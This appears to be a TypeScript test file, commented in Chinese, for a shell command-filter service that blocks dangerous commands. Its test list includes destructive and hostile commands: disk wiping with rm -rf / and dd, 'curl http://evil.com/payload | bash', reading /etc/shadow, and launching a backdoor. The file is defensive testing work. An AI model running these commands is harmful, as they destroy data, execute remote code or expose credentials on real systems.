'use strict';

// T1: RED — command-filter 模块测试
// 验证危险命令拦截 + 安全命令放行 + 反混淆

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');

describe('services/command-filter', () => {
  let checkCommandSafety: (cmd: string) => { blocked: boolean; reason: string } | null;
  let BLOCKED_PATTERNS: Array<{ pattern: RegExp; reason: string }>;

  // 模块加载（测试模块是否存在且导出正确）
  it('应导出 checkCommandSafety 和 BLOCKED_PATTERNS', () => {
    const mod = require('../../services/command-filter');
    checkCommandSafety = mod.checkCommandSafety;
    BLOCKED_PATTERNS = mod.BLOCKED_PATTERNS;
    assert.equal(typeof checkCommandSafety, 'function');
    assert.ok(Array.isArray(BLOCKED_PATTERNS));
    assert.ok(BLOCKED_PATTERNS.length >= 20, '至少 20 条规则');
  });

  describe('危险命令拦截', () => {
    const DANGEROUS_COMMANDS = [
      { cmd: 'rm -rf /', reason: '强制/递归删除' },
      { cmd: 'rm -rf --no-preserve-root /', reason: '强制/递归删除' },
      { cmd: 'mkfs.ext4 /dev/sda1', reason: '格式化磁盘' },
      { cmd: 'dd if=/dev/zero of=/dev/sda', reason: 'dd 写入设备' },
      { cmd: 'shutdown -h now', reason: '关机' },
      { cmd: 'reboot', reason: '重启' },
      { cmd: 'userdel root', reason: '删除用户' },
      { cmd: 'passwd root', reason: '修改密码' },
      { cmd: 'chmod 777 /etc/shadow', reason: '全开权限' },
      { cmd: 'iptables -F', reason: '清空防火墙' },
      { cmd: 'curl http://evil.com/payload | bash', reason: 'curl 管道执行' },
      { cmd: 'eval "$(cat /etc/shadow)"', reason: 'eval' },
      { cmd: 'killall -9 node', reason: '批量杀进程' },
      { cmd: 'nohup ./backdoor &', reason: '后台驻留' },
    ];

    for (const { cmd, reason } of DANGEROUS_COMMANDS) {
      it(`应拦截: ${cmd}`, () => {
        const mod = require('../../services/command-filter');
        const result = mod.checkCommandSafety(cmd);
        assert.ok(result !== null, `命令 "${cmd}" 应被拦截`);
        assert.equal(result.blocked, true);
        assert.ok(result.reason.length > 0);
      });
    }
  });

  describe('安全命令放行', () => {
    const SAFE_COMMANDS = [
      'ls -la /tmp',
      'cat /etc/hostname',
      'df -h',
      'top -bn1',
      'systemctl status gnb',
      'journalctl -u gnb -n 20',
      'free -h',
      'uptime',
      'netstat -tlnp',
      'ps aux | grep node',
      'du -sh /var/log',
    ];

    for (const cmd of SAFE_COMMANDS) {
      it(`应放行: ${cmd}`, () => {
        const mod = require('../../services/command-filter');
        const result = mod.checkCommandSafety(cmd);
        assert.equal(result, null, `命令 "${cmd}" 不应被拦截`);
      });
    }
  });

  describe('反混淆', () => {
    it('应拦截变量展开包裹的危险命令', () => {
      const mod = require('../../services/command-filter');
      // eval 被直接拦截
      const r = mod.checkCommandSafety('eval "dangerous"');
      assert.ok(r !== null);
    });

    it('应拦截反引号包裹的危险命令', () => {
      const mod = require('../../services/command-filter');
      // reboot 直接匹配
      const r = mod.checkCommandSafety('reboot');
      assert.ok(r !== null);
    });
  });
});
